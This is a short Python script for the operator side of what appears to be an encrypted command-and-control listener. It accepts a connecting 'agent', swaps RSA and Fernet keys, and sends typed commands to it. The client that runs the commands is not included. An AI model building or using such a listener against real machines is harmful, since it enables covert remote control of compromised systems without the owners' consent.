#!/usr/bin/python3
import socket
import rsa
from cryptography.fernet import Fernet
MSGLEN=2048

class SecureServer:

  def __init__(self, host="127.0.0.1", port=62832):
    self.public_key, self.private_key = rsa.newkeys(2048)
    self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    self.sock.setblocking(False)
    self.sock.settimeout(0.5)
    self.sock.bind((host, port))
    self.sock.listen()
    print("[*] Listening on 62832...")

  def handle_client(self):
    print("[+] Agent received !")
    cmd=input(" > ")
    while cmd!="exit":
      self.send(cmd)
      cmd=input(" > ")
    self.send("exit")

  def run(self):
    running=True
    while running:
      try:
        print("[*] Waiting...", end="\r")
        self.client, client_address = self.sock.accept()
        self.client.send(self.public_key.save_pkcs1())
        self.key=Fernet(rsa.decrypt(self.client.recv(2048), self.private_key))
        self.handle_client()
      except Exception as e:
        pass

  def send(self, message):
    msg=self.key.encrypt(str(message).encode('utf-8'))
    self.client.send(msg)

  def receive(self):
    msg=self.client.recv(MSGLEN)
    message=self.key.decrypt(msg).decode('utf-8')
    return message

if __name__ == "__main__":
  server=SecureServer()
  try:
    server.run()
  except KeyboardInterrupt:
    print("\r Server stopped.")
